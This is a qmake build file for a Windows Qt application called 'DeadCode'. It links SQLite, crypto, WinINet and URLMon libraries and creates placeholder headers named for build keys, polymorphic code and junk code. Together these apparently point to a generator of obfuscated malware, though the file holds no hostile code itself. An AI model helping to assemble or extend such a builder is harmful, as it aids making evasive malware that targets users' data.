QT       += core gui network widgets

TARGET = DeadCode
TEMPLATE = app

# Исходные файлы
SOURCES += ../src/main.cpp \
           mainwindow.cpp

# Заголовочные файлы
HEADERS += mainwindow.h \
           ../src/build_key.h \
           ../src/polymorphic_code.h \
           ../src/junk_code.h

# Файлы интерфейса
FORMS   += mainwindow.ui

# Файл ресурсов для иконки
RC_FILE = icon.rc

# Пути для заголовочных файлов
INCLUDEPATH += $$PWD/../src \
               $$PWD \
               $$[QT_INSTALL_HEADERS] \
               $$[QT_INSTALL_HEADERS]/QtWidgets \
               $$[QT_INSTALL_HEADERS]/QtGui \
               $$[QT_INSTALL_HEADERS]/QtNetwork \
               $$[QT_INSTALL_HEADERS]/QtCore

# Пути для библиотек (используем динамическое определение VCPKG)
VCPKG_INSTALL_DIR = $$(VCPKG_INSTALL_DIR)
isEmpty(VCPKG_INSTALL_DIR) {
    VCPKG_INSTALL_DIR = C:/vcpkg/installed/x64-windows-static
    message("VCPKG_INSTALL_DIR not set, using default: $$VCPKG_INSTALL_DIR")
}
INCLUDEPATH += $$VCPKG_INSTALL_DIR/include
LIBS += -L$$VCPKG_INSTALL_DIR/lib \
        -lsqlite3 \
        -lzip \
        -lz \
        -lbz2 \
        -llibssl \
        -llibcrypto \
        -lbcrypt \
        -lws2_32 \
        -lwininet \
        -lgdiplus \
        -liphlpapi \
        -lcrypt32 \
        -lurlmon \
        -lole32 \
        -lshell32

# Флаги компиляции
QMAKE_CXXFLAGS += -O2 \
                  -std=gnu++17 \
                  -Wall \
                  -Wextra \
                  -Werror=return-type \
                  -fexceptions \
                  -DUNICODE \
                  -D_UNICODE \
                  -DWIN32 \
                  -DQT_NO_DEBUG

# Флаги линковки
QMAKE_LFLAGS += -DYNAMICBASE \
                -NXCOMPAT \
                -SUBSYSTEM:WINDOWS

# Определения для сборки
DEFINES += BUILD_DATE=\\\"$$system(date /t)\\\" \
           BUILD_VERSION=\\\"$$system(git rev-parse --short HEAD 2> nul || echo unknown)\\\"

# Директории для выходных файлов
DESTDIR = ../build
OBJECTS_DIR = release
MOC_DIR = release
UI_DIR = release

# Очистка
QMAKE_CLEAN += $$DESTDIR/DeadCode.exe

# Дополнительные проверки и зависимости
win32 {
    CONFIG(debug, debug|release) {
        # Для отладочной сборки
        QMAKE_CXXFLAGS += -g
        LIBS += -lgdi32
    } else {
        # Для релизной сборки
        QMAKE_LFLAGS += -static
    }
}

# Пользовательские шаги сборки для генерации заголовков
PRE_TARGETDEPS += $$PWD/../src/build_key.h \
                  $$PWD/../src/polymorphic_code.h \
                  $$PWD/../src/junk_code.h

QMAKE_EXTRA_TARGETS += gen_headers
gen_headers.commands = @echo "Headers are generated during runtime by mainwindow.cpp"
# Создание пустых файлов, если они отсутствуют
!exists($$PWD/../src/build_key.h) {
    system(echo. > $$PWD/../src/build_key.h)
}
!exists($$PWD/../src/polymorphic_code.h) {
    system(echo. > $$PWD/../src/polymorphic_code.h)
}
!exists($$PWD/../src/junk_code.h) {
    system(echo. > $$PWD/../src/junk_code.h)
}